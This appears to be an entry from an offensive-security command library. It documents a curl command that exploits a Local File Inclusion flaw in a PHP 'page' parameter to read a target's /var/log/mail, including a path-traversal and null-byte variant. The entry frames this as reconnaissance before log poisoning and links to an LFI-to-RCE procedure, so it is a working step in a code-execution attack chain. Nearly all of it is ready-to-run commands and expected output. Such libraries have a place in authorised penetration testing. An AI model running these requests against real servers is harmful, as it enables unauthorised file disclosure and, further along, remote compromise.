---
id: 8ca1de88-bf4c-4e13-9b45-68714173e407
name: curl-lfi-access-mail-log
type: command
executor: bash
data: 'curl "http://$_TARGET_HOST/index.php?page=/var/log/mail"'
output: null
created_at: '2023-04-06T03:55:58.606935+00:00'
updated_at: '2023-10-10T20:22:15.234874+00:00'
platforms:
  - Linux
  - Web
tags:
  - lfi
  - recon
verified: true
validated: true
---

# curl-lfi-access-mail-log

## Command

```bash
curl "http://$_TARGET_HOST/index.php?page=/var/log/mail"
```

## Description

This command uses curl to test a Local File Inclusion (LFI) vulnerability by requesting the target's mail log file through a vulnerable PHP parameter. It helps verify if the LFI works and displays log contents for reconnaissance before poisoning.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_HOST | IP or domain of the vulnerable web server (e.g., 10.10.10.10 or example.com) | Yes |
| /var/log/mail | Path to the mail log file; adjust if different (e.g., /var/log/maillog) | Yes |
| index.php?page= | Vulnerable endpoint and parameter; customize based on app | Yes |

## Examples

### Basic Usage

```bash
curl "http://10.10.10.10/index.php?page=/var/log/mail"
```

### With Path Traversal

```bash
curl "http://10.10.10.10/index.php?page=../../../../var/log/mail%00"
```

## Expected Output

If successful, the response body contains the contents of /var/log/mail, such as:

```
Apr 10 12:34:56 hostname postfix/smtp[1234]: ABC123: to=<root@hostname>, relay=example.com[1.2.3.4]:25, delay=0.5, delays=0.1/0.1/0.2/0.1, dsn=2.0.0, status=sent (250 Ok)
```
Log entries or errors if the file is inaccessible.

## Related

- [[procedures/LFI-to-RCE-via-Mail-Log-File-Inclusion]]
- [[commands/telnet-smtp-php-injection]]
